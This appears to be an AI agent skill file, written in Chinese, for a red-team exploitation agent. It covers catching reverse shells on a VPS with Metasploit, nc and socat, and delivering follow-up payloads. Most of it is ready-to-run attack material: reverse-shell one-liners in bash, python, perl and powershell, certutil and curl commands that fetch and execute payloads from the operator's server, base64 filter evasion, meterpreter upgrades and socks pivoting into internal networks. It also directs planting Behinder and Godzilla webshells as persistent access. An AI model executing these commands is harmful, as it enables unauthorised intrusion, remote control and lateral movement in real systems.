---
name: shell-handler
description: 反弹 Shell 与载荷投递：VPS 上起 MSF/nc/socat 监听接收 shell，或从目标主动拉取载荷落地
whenToUse: 需要 RCE/命令执行回连、投递后续载荷、把一次性命令执行变成可交互会话时
role: exploit
enabled: true
---

# 反弹 Shell 与载荷投递（拿到回连会话）

> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

**命令执行 ≠ 会话**。一次性的 `?cmd=whoami` 只能证明有洞，不能持续操作。本技能负责把"能执行命令"
变成**稳定、可交互、可复用**的回连会话，并投递后续载荷（马、隧道、扫描器）。

## 本机基础设施

| 项 | 值 |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST`（SSH 端口 22，私钥 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） |
| 载荷分发 | `http://$REDTEAM_VPS_HOST:9100/`（fscan/gogo/冰蝎马/哥斯拉马已同步） |
| 监听端口段 | `9000-9999` |
| 会话管理 | `tmux`（监听必须跑在 tmux 里，否则断开即丢） |
| 本机工具 | `nc`、`socat`、`msfconsole` 6.5.3（`exploit/multi/handler`、`exploit/multi/script/web_delivery` 已验证存在） |

配套技能：`vps-reverse-shell`（VPS 登录与监听的具体操作）、`webshell-toolkit`（落地冰蝎/哥斯拉马）。

## 一、选型：什么时候用哪个

| 场景 | 用法 |
| --- | --- |
| **临时验证**（只想跑一条命令看回显） | `nc -lvnp <port>` + 目标侧 bash/python 反弹，够用就走 |
| **要长期操作 / 传文件 / 开隧道**（**主力**） | **MSF `multi/handler`**（自动重连、可升级 meterpreter、能开 socks） |
| **目标只能出 HTTP(S)** | `web_delivery`（MSF 生成一行命令，目标主动拉 payload） |
| **Windows 目标、要稳** | MSF handler + `shell_to_meterpreter` 升级 |
| **需要把内网流量代理回来** | 拿到 shell 后**不是**用 shell 代理，而是落地 WebShell → `suo5-tunnel`（见技能） |

## 二、MSF handler（推荐主力）

```bash
# 1) 在 VPS 的 tmux 里起监听（本机/VPS 都行，看回连方向）
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows：windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # 关键：会话断了不退出，继续等重连
msf6 > exploit -j                    # 后台监听
```

**起监听前先确认端口没被占**：`ss -lntp | grep 9001`；VPS 安全组要放行该端口。

一次性投递 + 收会话的完整链路示例：
```bash
# 目标侧（假设有一个命令执行点）
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# 无 bash 时用别的（见下表）
```

## 三、各语言反弹一句话（按目标环境选）

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# Linux - 无 bash（sh + nc）
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Windows - powershell（注意转义与执行策略）
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# Windows - certutil 下载载荷后执行
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24
# Linux - curl/wget 下载载荷
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**编码绕过**：命令里有空格/引号被拦时，base64 编码后解：
```bash
# 生成（本机）
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# 目标执行
echo <BASE64> | base64 -d | bash
```

## 四、MSF web_delivery（只能出 HTTP 时）

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python（先 show targets 看列表）
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF 会输出一行命令（形如 python -c "import urllib.request;..."），
# 把它投到目标的命令执行点 → 目标主动拉 payload → 会话建立
```

## 五、升级与维持

```bash
# shell 升级为 meterpreter（能开 socks、传文件、提权）
msf6 > sessions -l
msf6 > sessions -u <id>            # 或者用 post/multi/manage/shell_to_meterpreter

# 通过 meterpreter 开内网 socks 代理
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# 之后 proxychains 指向 127.0.0.1:1080 即可进内网
```
> ⚠️ 记分口径：**只有自己 VPS 上的代理不算隧道**。通过 meterpreter autoroute 打到的内网目标属于
> `entry_kind=target-agent`（经目标已控进程转发），登记 `redteam_tunnel_add` 时必须说清目标侧那一端。

## 六、纪律（必须遵守）

1. **监听必须跑在 tmux 里**：SSH 断线会杀掉监听，会话就丢了。`tmux new -s handler` / `tmux a -t handler`。
2. **端口先探测占用**，VPS 安全组放行；一台机器同时别开太多监听（9000-9999 段内按序用）。
3. **反弹 shell 是"目标主动外连"**：目标出网受限时先试 HTTP(S) 出网（80/443/8080），
   完全不出网就只能走 WebShell + 隧道（`suo5-tunnel`）。
4. **不要在生产系统跑会重启服务的载荷**；提权/内核漏洞类操作先评估重启风险。
5. **会话要登记**：拿到 shell 立刻 `redteam_session_check` 后面能用；隧道登记见 `redteam_tunnel_add`。

## 七、输出与落库（强制）

1. **拿到回连会话立刻记分**：`redteam_score_hit`（`server-host` / `server-host`），`evidence` 写「资产｜shell 类型与权限」（如 `10.0.0.5｜root shell（uid=0）`）。
2. **会话落库**：`redteam_access_add`（`method=reverse-shell`，写清 `target`、`user`、`privilege`、监听地址与端口）。
3. **隧道落库**（若通过它进了内网）：`redteam_tunnel_add`，`entry_kind` 必须说清目标侧那一端
   （`target-outbound`=目标反弹/目标跑 frp 客户端、`target-http`=经目标 WebShell 的 suo5、`target-agent`=经目标已控进程转发），
   然后 `redteam_session_check` 实测连通性。
4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（互联网侧拿权限）/ `boundary`（搭隧道）/ `internal`，
   `tool` 写**实际命令原文**（含完整反弹命令或 MSF 配置），`result` 写回显摘要（如 `uid=0(root) gid=0(root)`）。
5. **交付给用户能复用的入口**：优先落地**冰蝎马/哥斯拉马**（技能 `webshell-toolkit`）——用户能在控制台直连操作；
   临时反弹会话要说明"这是一次性会话，非交付入口"。
